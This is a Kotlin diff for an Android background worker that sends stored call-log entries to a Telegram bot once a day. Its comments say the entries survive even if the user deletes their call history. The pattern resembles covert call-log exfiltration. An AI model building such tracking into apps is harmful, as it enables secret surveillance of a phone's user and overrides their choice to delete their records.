@@ -4,6 +4,8 @@ import android.content.Context
 import androidx.work.Worker
 import androidx.work.WorkerParameters
 
+// Runs daily at 5 AM — reads from LOCAL store (not system call log)
+// So even if user deletes call history, backup still has it
 class BackupWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params) {
 
     override fun doWork(): Result {
@@ -11,22 +13,16 @@ class BackupWorker(ctx: Context, params: WorkerParameters) : Worker(ctx, params)
         val chatId = BuildConfig.TELEGRAM_CHAT_ID
         if (token.isBlank() || chatId.isBlank()) return Result.failure()
 
-        val store       = LastBackupStore(applicationContext)
-        val lastBackup  = store.getLastBackupTime()
-        val backupStart = System.currentTimeMillis()
+        val store   = CallStore(applicationContext)
+        val entries = store.readAll()
 
-        // Only fetch calls that happened AFTER the last backup
-        val allEntries  = CallLogReader(applicationContext).read()
-        val newEntries  = if (lastBackup == 0L) allEntries
-                          else allEntries.filter { it.date > lastBackup }
+        if (entries.isEmpty()) return Result.success() // nothing to send
 
-        if (newEntries.isEmpty()) return Result.success() // nothing new, skip
-
-        val err = TelegramSender.send(newEntries, token, chatId, lastBackup)
+        val err = TelegramSender.send(entries, token, chatId, 0L)
         if (err != null) return Result.retry()
 
-        // Save timestamp only after successful send
-        store.setLastBackupTime(backupStart)
+        // Clear local store only after successful send
+        store.clearAfterBackup()
         return Result.success()
     }
 }
